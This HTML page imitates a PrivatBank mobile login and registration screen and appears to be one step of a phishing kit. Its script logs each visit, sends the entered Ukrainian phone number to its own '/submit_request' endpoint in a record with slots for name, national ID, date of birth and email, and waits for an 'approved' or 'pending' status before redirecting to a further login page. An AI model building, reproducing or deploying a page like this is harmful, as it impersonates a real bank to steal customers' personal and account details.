<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Login / Registration — PrivatBank</title>
  <style>
    :root{--green:#4caf20;--green-dark:#3d9717;--ink:#1d1d1d;--page:#f4f4f4;--mint:#e8f4e5}*{box-sizing:border-box}html,body{margin:0;min-width:320px;background:var(--page);color:var(--ink);font-family:Arial,Helvetica,sans-serif}body{min-height:100vh}.app{width:100%;max-width:600px;margin:0 auto;min-height:100vh;background:var(--page);padding-bottom:28px}.topbar{height:96px;padding:22px 30px 14px;display:flex;align-items:center;justify-content:space-between;background:linear-gradient(135deg,#d7f1dc 0%,#dff4f1 100%)}.topbar h1{margin:0;font-size:clamp(25px,4.5vw,38px);font-weight:500;letter-spacing:-1.2px;text-align:center;flex:1}.menu,.support{width:42px;height:42px;display:grid;place-items:center;flex:0 0 42px}.menu span,.menu span:before,.menu span:after{display:block;width:35px;height:4px;border-radius:4px;background:#151515;content:"";position:relative}.menu span:before{position:absolute;top:-11px}.menu span:after{position:absolute;top:11px}.support svg{width:40px;height:40px;stroke:#151515;stroke-width:2;fill:none}main{padding:26px 28px 0}.card{background:#fff;border-radius:18px;padding:36px 28px 26px;box-shadow:0 2px 8px rgba(0,0,0,.03)}.field-label{display:block;font-size:27px;margin:0 0 13px}.phone-row{height:82px;border:3px solid #2189d8;border-radius:20px;background:#e9e9e9;box-shadow:0 0 0 7px rgba(77,160,226,.22);display:flex;align-items:center;overflow:hidden}.country{height:100%;min-width:168px;background:#fff;border-radius:15px;display:flex;align-items:center;gap:20px;padding:0 22px;font-size:27px;border-right:1px solid #cfcfcf}.flag{font-size:34px;line-height:1}.phone{min-width:0;flex:1;height:100%;border:0;outline:0;background:transparent;padding:0 20px;font-size:27px;color:#555}.phone::placeholder{color:#9b9b9b}.consent{display:flex;gap:22px;align-items:flex-start;margin:30px 0 26px;font-size:24px;line-height:1.45}.consent input{appearance:none;width:33px;height:33px;flex:0 0 33px;margin:2px 0 0;border-radius:5px;background:var(--green);position:relative}.consent input:checked:after{content:"✓";position:absolute;left:6px;top:-3px;color:white;font-size:34px;font-weight:bold}.consent a{color:#4c9237;text-decoration:underline}.continue{width:100%;height:70px;border:0;border-radius:13px;background:var(--green);color:#fff;font-size:28px;cursor:pointer;box-shadow:0 3px 5px rgba(0,0,0,.18)}.continue:hover{background:var(--green-dark)}.error{display:none;color:#bb2626;text-align:center;font-size:18px;margin:0 0 16px}.quick-links{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;padding:28px 34px 38px;text-align:center}.quick-icon{width:78px;height:78px;margin:0 auto 14px;border-radius:50%;background:#e5e5e5;display:grid;place-items:center;font-size:54px}.quick-label{font-size:24px}.bank-card{background:var(--mint);border:2px solid #d3e9ce;border-radius:20px;padding:30px 26px 26px;text-align:center}.bank-card .card-art{width:108px;height:70px;border-radius:8px;margin:0 auto 24px;background:linear-gradient(135deg,#6f90b7,#31547f);box-shadow:inset 0 0 16px rgba(0,0,0,.22)}.bank-card h2{font-size:27px;font-weight:500;margin:0 0 12px}.bank-card p{font-size:24px;margin:0 0 34px}.issue{height:70px;border:0;border-radius:16px;background:#fff;color:#5ba746;font-size:24px;width:100%;box-shadow:0 2px 5px rgba(0,0,0,.12)}.bottom-nav{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin:44px -8px 0;text-align:center}.nav-item{font-size:18px}.nav-icon{height:46px;font-size:32px;display:grid;place-items:center;margin-bottom:8px}.nav-item.active{color:#58a743}@media(max-width:620px){.app{zoom:.82}.topbar{height:60px;padding:10px 12px 8px}.topbar h1{font-size:19px}.menu,.support{width:34px;height:34px;flex-basis:34px}.menu span,.menu span:before,.menu span:after{width:31px;height:3px}.support svg{width:34px;height:34px}main{padding:6px 8px 0}.card{padding:10px 10px 9px;border-radius:12px}.field-label{font-size:18px;margin-bottom:5px}.phone-row{height:48px;border-radius:16px;box-shadow:0 0 0 5px rgba(77,160,226,.22)}.country{min-width:112px;padding:0 12px;gap:8px;font-size:18px}.flag{font-size:21px}.phone{font-size:18px;padding:0 9px}.consent{gap:7px;margin:9px 0 8px;font-size:14px;line-height:1.18}.consent input{width:23px;height:23px;flex-basis:23px}.consent input:checked:after{font-size:27px;left:5px;top:-3px}.continue{height:42px;font-size:17px;border-radius:8px}.quick-links{padding:8px 0 10px;gap:2px}.quick-icon{width:44px;height:44px;font-size:25px}.quick-label{font-size:12px}.bank-card{padding:10px 10px 9px;border-radius:12px}.bank-card .card-art{width:58px;height:36px;margin-bottom:5px}.bank-card h2{font-size:16px;margin-bottom:4px}.bank-card p{font-size:12px;margin-bottom:7px}.issue{height:38px;font-size:15px;border-radius:8px}.bottom-nav{margin-top:10px}.nav-item{font-size:11px}.nav-icon{font-size:20px;height:24px;margin-bottom:1px}}
  </style>
</head>
<body>
  <div class="app">
    <header class="topbar"><div class="menu" aria-label="Menu"><span></span></div><h1>Login / Registration</h1><div class="support" aria-label="Support"><svg viewBox="0 0 24 24"><path d="M4 13v-2a8 8 0 0 1 16 0v2M4 13a2 2 0 0 0 2 2h1v-4H6a2 2 0 0 0-2 2Zm16 0a2 2 0 0 1-2 2h-1v-4h1a2 2 0 0 1 2 2ZM9 20h6M9 18h6"/><circle cx="9" cy="10" r="1" fill="#151515"/><circle cx="15" cy="10" r="1" fill="#151515"/></svg></div></header>
    <main>
      <section class="card"><form id="personalInfoForm"><label class="field-label" for="phone">Phone number</label><div class="phone-row"><div class="country"><span class="flag">🇺🇦</span><bdi>+380</bdi></div><input class="phone" id="phone" name="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="00 000 00 00" required></div><label class="consent"><input id="consent" type="checkbox" checked required><span>I confirm that I have read and agree to the <a href="#">Terms and Conditions</a>, and I consent to the <a href="#">Bank's processing of my personal data</a></span></label><div class="error" id="errorMessage"></div><button class="continue" type="submit">Continue</button></form></section>
      <section class="quick-links"><div><div class="quick-icon"><svg viewBox="0 0 64 64" aria-hidden="true"><path d="M17 17l15 15-15 15M33 17l15 15-15 15" fill="none" stroke="#111" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="quick-label">Transfer</div></div><div><div class="quick-icon"><svg viewBox="0 0 64 64" aria-hidden="true"><rect x="21" y="12" width="22" height="40" rx="3" fill="none" stroke="#111" stroke-width="5"/><circle cx="32" cy="45" r="2" fill="#111"/></svg></div><div class="quick-label">Mobile</div></div><div><div class="quick-icon"><svg viewBox="0 0 64 64" aria-hidden="true"><path d="M16 23c12-10 20 10 32 0M16 33c12-10 20 10 32 0M16 43c12-10 20 10 32 0" fill="none" stroke="#111" stroke-width="5" stroke-linecap="round"/></svg></div><div class="quick-label">Payments</div></div></section>
      <section class="bank-card"><div class="card-art"></div><h2>PrivatBank cards</h2><p>Free issue. Delivery across Ukraine and the world</p><button class="issue" type="button">Issue a card</button></section>
      <nav class="bottom-nav"><div class="nav-item active"><div class="nav-icon"><svg viewBox="0 0 64 64"><path d="M10 31L32 12l22 19v22H39V39H25v14H10z" fill="currentColor"/></svg></div>Home</div><div class="nav-item"><div class="nav-icon"><svg viewBox="0 0 64 64"><path d="M20 25c0-6 24-6 24 0v5c0 4-3 7-6 9l5 10c1 3-2 5-5 5H26c-3 0-6-2-5-5l5-10c-3-2-6-5-6-9z" fill="#111"/><path d="M25 22c1-5 13-5 14 0" fill="none" stroke="#111" stroke-width="4" stroke-linecap="round"/></svg></div>Loans</div><div class="nav-item"><div class="nav-icon"><svg viewBox="0 0 64 64"><path d="M9 18h46v30H9zM9 20l23 16 23-16" fill="none" stroke="#111" stroke-width="5" stroke-linejoin="round"/></svg></div>Envelopes</div><div class="nav-item"><div class="nav-icon"><svg viewBox="0 0 64 64"><path d="M32 52c-4-5-18-17-18-29 0-4 3-6 6-2l8 11V14c0-4 6-4 6 0v15-21c0-4 6-4 6 0v21-16c0-4 6-4 6 0v18-11c0-4 6-4 6 1 0 17-8 27-20 31z" fill="#111"/></svg></div>Pryvit</div><div class="nav-item"><div class="nav-icon"><svg viewBox="0 0 64 64"><rect x="10" y="10" width="18" height="18" rx="3" fill="#111"/><rect x="36" y="10" width="18" height="18" rx="3" fill="#111"/><rect x="10" y="36" width="18" height="18" rx="3" fill="#111"/><rect x="36" y="36" width="18" height="18" rx="3" fill="#111"/></svg></div>More</div></nav>
    </main>
  </div>
  <script>
    fetch('/track_visit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'track_visit',page:'personal_info_en'})}).catch(()=>{});
    const form=document.getElementById('personalInfoForm');const error=document.getElementById('errorMessage');
    form.addEventListener('submit',async(e)=>{e.preventDefault();const phone=document.getElementById('phone').value.replace(/[^0-9]/g,'');try{const r=await fetch('/submit_request',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'personal_info',data:{fullName:'',nationalId:'',idExpiry:'',phone:'+380'+phone,dob:'',email:''}})});const result=await r.json();if(result.status==='approved'||result.status==='pending'){localStorage.setItem('request_id',result.request_id);window.location.href='login_en.html'}else{error.textContent=result.message||'An unexpected error occurred.';error.style.display='block'}}catch(err){error.textContent='Error connecting to the server.';error.style.display='block'}});
  </script>
</body>
</html>
